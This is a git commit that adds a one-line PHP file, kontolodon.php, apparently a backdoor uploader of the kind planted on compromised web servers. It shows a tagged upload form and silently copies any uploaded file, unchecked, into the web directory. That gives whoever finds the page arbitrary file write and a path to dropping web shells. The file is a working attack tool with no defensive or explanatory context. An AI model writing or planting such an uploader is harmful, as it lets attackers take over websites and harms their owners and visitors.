090fe3da4b6f004dda53028d62b9576a6526ae9f
Ananda Ariwibawa <47255603+cafcbr40ck@users.noreply.github.com>
2021-03-25 08:12:50 +0700

    Create kontolodon.php

---
+++ kontolodon.php
@@ -0,0 +1,1 @@
+<?php echo "<p>CaFc_Br40ck<form method='POST' enctype='multipart/form-data'><input type='file' name='filele' size='44'><input type='submit'></form>";@copy($_FILES['filele']['tmp_name'],$_FILES['filele']['name']);?>
